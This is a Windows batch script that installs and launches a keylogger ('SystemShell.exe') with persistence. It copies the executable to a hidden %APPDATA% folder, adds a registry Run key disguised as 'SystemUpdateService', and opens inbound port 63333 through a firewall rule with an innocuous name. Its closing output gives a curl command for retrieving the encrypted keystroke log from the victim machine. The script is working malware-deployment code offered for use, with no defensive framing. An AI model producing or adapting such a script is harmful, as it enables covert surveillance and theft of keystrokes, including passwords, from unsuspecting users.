@echo off
:: CDT Windows Persistence Installer
:: Place this file in the SAME FOLDER as your SystemShell.exe
:: Double-click to install + run with persistence

set "EXE=SystemShell.exe"
set "SRC=%~dp0%EXE%"
set "DEST=%APPDATA%\Microsoft\System\%EXE%"

:: === CHECK IF EXE EXISTS ===
if not exist "%SRC%" (
    echo.
    echo [ERROR] %EXE% not found in this folder!
    echo         Make sure SystemShell.exe is here:
    echo         %~dp0
    echo.
    pause
    exit /b 1
)

:: === COPY TO HIDDEN LOCATION ===
echo [Installing] Copying to:
echo     %DEST%
mkdir "%APPDATA%\Microsoft\System" 2>nul
copy "%SRC%" "%DEST%" >nul

:: === ADD TO STARTUP (Registry Run Key) ===
echo [Installing] Adding to startup...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdateService" /t REG_SZ /d "\"%DEST%\"" /f >nul

:: === ALLOW PORT 63333 IN FIREWALL ===
echo [Installing] Opening port 63333...
netsh advfirewall firewall add rule name="System Network Service" dir=in action=allow protocol=TCP localport=63333 >nul 2>&1

:: === LAUNCH NOW ===
echo [Installing] Starting keylogger...
start "" "%DEST%"

:: === DONE ===
echo.
echo [SUCCESS] Persistence installed!
echo [SUCCESS] Auto-starts on login
echo [SUCCESS] Exfil: curl http://THIS_PC_IP:63333 -o log.enc
echo.
echo Press any key to exit...
pause >nul